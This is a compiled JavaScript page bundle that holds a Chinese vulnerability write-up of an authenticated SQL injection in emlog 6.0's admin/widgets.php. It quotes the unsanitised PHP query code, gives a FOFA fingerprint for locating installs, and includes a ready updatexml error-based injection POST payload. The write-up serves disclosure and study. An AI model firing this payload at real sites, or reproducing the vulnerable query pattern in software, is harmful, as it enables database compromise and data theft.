(window.webpackJsonp=window.webpackJsonp||[]).push([[80],{1224:function(t,s,a){t.exports=a.p+"assets/img/1634002177714-22159b01-c44f-476a-bb4f-8363cceb9460.60d83010.png"},1225:function(t,s,a){t.exports=a.p+"assets/img/1634002231213-67b50259-52f0-4cf0-983b-fc1a88cc6471.53881fb3.png"},1226:function(t,s,a){t.exports=a.p+"assets/img/1634002837216-c1000372-81ea-4671-bc5d-c378110d93db.bef4ea0a.png"},1227:function(t,s,a){t.exports=a.p+"assets/img/1634002917512-820b18c8-d37a-4507-974c-1ba9c2afc2ed.c3fccf84.png"},1228:function(t,s,a){t.exports=a.p+"assets/img/1634003089227-452c8b4e-d367-4f01-af1f-e90a79bfd91f.7738accc.png"},3019:function(t,s,a){"use strict";a.r(s);var n=a(63),e=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"emlog-widgets-php-后台sql注入漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#emlog-widgets-php-后台sql注入漏洞"}},[t._v("#")]),t._v(" emlog widgets.php 后台SQL注入漏洞")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("emlog widgets.php文件在登录后通过构造特殊语句导致SQL注入，获取数据库敏感信息")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("emlog 6.0 ")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v('app="EMLOG"')]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("产品主页")]),t._v(" "),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[t._v("https"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v("github"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("emlog"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("emlog\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:a(1224),alt:"img"}})]),t._v(" "),s("p",[t._v("存在漏洞的文件为 "),s("code",[t._v("admin/widgets.php")])]),t._v(" "),s("p",[s("img",{attrs:{src:a(1225),alt:"img"}})]),t._v(" "),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$action "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'compages'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    $wgNum "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" isset"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$_POST"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'wgnum'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" ? intval"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$_POST"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'wgnum'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v("侧边栏编号 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("、"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("、"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),t._v(" ……\n    $widgets "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" isset"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$_POST"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'widgets'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" ? serialize"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$_POST"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'widgets'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    Option"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("updateOption"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"widgets{$wgNum}"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" $widgets"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    $CACHE"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("updateCache"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'options'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    emDirect"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"./widgets.php?activated=true&wg=$wgNum"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br")])]),s("p",[t._v("传参为 wgnum 和 widgets ，跟踪方法 "),s("code",[t._v("updateOption")])]),t._v(" "),s("p",[s("img",{attrs:{src:a(1226),alt:"img"}})]),t._v(" "),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[t._v("static function updateOption"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$name"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" $value"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" $isSyntax "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" false"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        $DB "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Database"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("getInstance"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        $value "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" $isSyntax ? $value "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"'$value'\"")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        $DB"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("query"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'UPDATE '")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("DB_PREFIX"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"options SET option_value=$value where option_name='$name'\"")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br")])]),s("p",[t._v("可以发现对传入的参数木有进行过滤，构造Payload")]),t._v(" "),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[t._v("POST "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("admin"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("widgets"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php?action"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("compages\n\nwidgets"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("' "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("and")]),t._v(" updatexml"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x3a")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("concat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("select user"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" \n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br")])]),s("p",[t._v("调试后可以发现，数据库报错语句会回显至页面中，报错注入即可获取敏感信息")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1227),alt:"img"}}),s("img",{attrs:{src:a(1228),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);